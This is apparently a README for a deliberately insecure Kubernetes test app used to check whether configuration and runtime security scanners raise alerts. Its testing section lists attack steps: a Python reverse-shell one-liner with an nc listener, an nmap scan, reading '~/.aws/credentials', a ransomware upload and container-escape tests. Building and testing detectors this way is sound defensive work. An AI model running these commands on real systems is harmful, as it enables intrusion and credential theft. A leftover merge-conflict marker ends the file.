<p align="center"><img src="https://raw.githubusercontent.com/latiotech/LAST/main/logo.png" width="150" ><br><h1 align="center">Insecure Kubernetes App</h1>
</p>

![GitHub stars](https://img.shields.io/github/stars/latiotech/insecure-kubernetes-deployments?style=social)
![GitHub release (latest by date)](https://img.shields.io/github/v/release/latiotech/insecure-kubernetes-deployments)
![GitHub issues](https://img.shields.io/github/issues/latiotech/insecure-kubernetes-deployments)
![GitHub pull requests](https://img.shields.io/github/issues-pr/latiotech/insecure-kubernetes-deployments)
![GitHub](https://img.shields.io/github/license/latiotech/insecure-kubernetes-deployments)
[![Discord](https://img.shields.io/discord/1119809850239614978)](https://discord.gg/k5aBQ55j5M)
![Docker Pulls](https://img.shields.io/docker/pulls/confusedcrib/insecure-app)

Test every type of configuration scanner against a single repo that's comically insecure with documented issues

[About Latio](https://latio.tech)  

- [Deployment](#deployment)
- [Issues to Test](#this-repo-contains-the-following-issues)
- [Testing Details](#testing)

## Deployment:

This will create an EKS cluster with some insecure application pods for testing.

1. Make sure you have [Terraform](https://developer.hashicorp.com/terraform/tutorials/aws-get-started/install-cli), [Helm](https://helm.sh/docs/intro/install/), [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html), [eksctl](https://eksctl.io/installation/) and a valid AWS user configured

2. Move to terraform directory, `cd terraform` and rejoice!

3. Apply the terraform, this creates an EKS cluster for testing: `terraform init` `terraform plan` `terraform apply` This creates two EKS node groups, one publicly accessible over SSH and another private. These will run small instances, be sure to `terraform destroy` when you're done for minimal fees. This takes about 15 minutes.

4. Add the Terraform EKS details to your kubeconfig
```
aws eks --region $(terraform output -raw region) update-kubeconfig \
    --name $(terraform output -raw cluster_name)
```

5. Grant your user access to the kubernetes cluster you created - through the Console it's adding the AmazonEKSAdminPolicy and AmazonEKSClusterAdminPolicy to your user. [Console](https://console.aws.amazon.com/eks/home#/clusters) > Access > Create access entry > Select your current user > Add AmazonEKSAdminPolicy and AmazonEKSClusterAdminPolicy. I didn't test this, but there's probably a one liner to do this with CLI like `aws eks create-access-entry --cluster-name my-cluster --principal-arn arn:aws:iam::111122223333:user/my-user --type Standard --username my-user`

6. Move to the helm chart directory `cd ../insecure-chart/`

7. Deploy the insecure app, busybox pod, and workload security evaluator `helm install insecure-app . --create-namespace --namespace=insecure-app`

8. To test in these pods:

Get pod name, `kubectl get pods -n insecure-app` or `kubectl get pods -n insecure-app`

For testing insecure-app, run `kubectl port-forward pod/[POD-NAME] 8080:8080 -n insecure-app`. You can now test in your browser at `http://localhost:8080/`

For testing insecure-app0js, run `kubectl port-forward pod/[POD-NAME] 3000:3000 -n insecure-js`. You can now test in your browser at `http://localhost:8080/`

For workload-security-evaluator, run `k exec -it [POD-NAME] -n insecure-app -- /bin/bash`, then `pwsh` to being invoking tests such as `Invoke-AtomicTest T1105-27 -ShowDetails`

9. `terraform destroy` when you're done!


## This Repo Contains the following issues:

### General Configuration Issues

1. Busybox is deployed as a long running pod with plenty of dangerous utilities on it
2. Insecure App has fake AWS access keys as env variables, mounts the docker socket, runs in privileged mode, is open on port 8080 and port 22, and binds an SA role with permissions to create more SA roles
3. Workload Security Evaluator contains all the same issues

### Insecure-app

1. Takes raw input as a web form and runs it as root on the server and returns the input to the user
2. Allows for unvalidated file uploads
3. Is running in debug mode
4. Has way more utilities on its Dockerfile than it needs

### Workload-security-evaluator

1. Is forked from [DataDog](https://github.com/DataDog/workload-security-evaluator)
2. Is used for running tests from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

# Testing 

## Misconfigurations

1. AWS creds in env variables
2. SSH port open
3. SA credentials have ability to create new credentials
4. Privileged container
5. Docker socket mounted

## Runtime

1. Run `python3 --version` and `ls -al` via the web form  - detects if it can tell that the python process is running bash commands
2. Run `apt-get update` and `apt-get install hydra -y` - to check for package installs
3. Scan the local port range to look for network detections - `nmap -sS 192.168.1.1-254`
4. Try to spawn a reverse shell
    - bash into workload-security and run `apt-get install netcat`
    - `nc -lvnp 9001`
    - `export RHOST="WORKLOAD-POD-IP";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`
5. Check what secrets we might have access to `printenv` and `cat ~/.aws/credentials`
6. Upload ransomware python script `ransomware.py`- this will indicate the level of alerting, if it's new file, python, or specifics about the python
7. Exec into the workload security evaluator pod with `k exec -it [POD-NAME] -n insecure-app -- /bin/bash`, then `pwsh`
8. `Invoke-AtomicTest T1105-27` - download and run a file
9. `Invoke-AtomicTest T1046-2` - run nmap
10. `Invoke-AtomicTest T1053.003-2` - modify cron jobs
11. `Invoke-AtomicTest T1070.003-1` - clear bash history
12. `Invoke-AtomicTest T1611-1,2` - Container escape
13. Check agent utilization with `k top pod --all-namespaces`
<<<<<<< HEAD
=======

Readme change
>>>>>>> b8e1c4d61873ed7566d33dcd8bd4b76bcf86e450
